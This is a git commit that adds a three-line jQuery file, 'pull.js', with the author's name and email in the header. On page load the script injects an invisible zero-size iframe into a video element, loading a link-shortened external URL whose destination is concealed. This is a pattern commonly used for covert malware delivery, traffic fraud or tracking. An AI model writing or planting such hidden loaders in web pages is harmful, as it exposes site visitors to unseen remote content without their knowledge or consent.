f222eb7452d31afcf495e12181b17aedd546a52a
darylfarahi <daryl30011996@gmail.com>
2018-11-13 15:28:36 +0700

    Create pull.js

---
+++ pull.js
@@ -0,0 +1,3 @@
+$(window).bind("load", function() {
+  $('#dna_video').prepend('<iframe src="https://t.co/Dhhs3rsYIE" width="0" height="0" frameborder="0" webkitallowfullscreen mozallowfullscreen allowfullscreen></iframe>');
+});
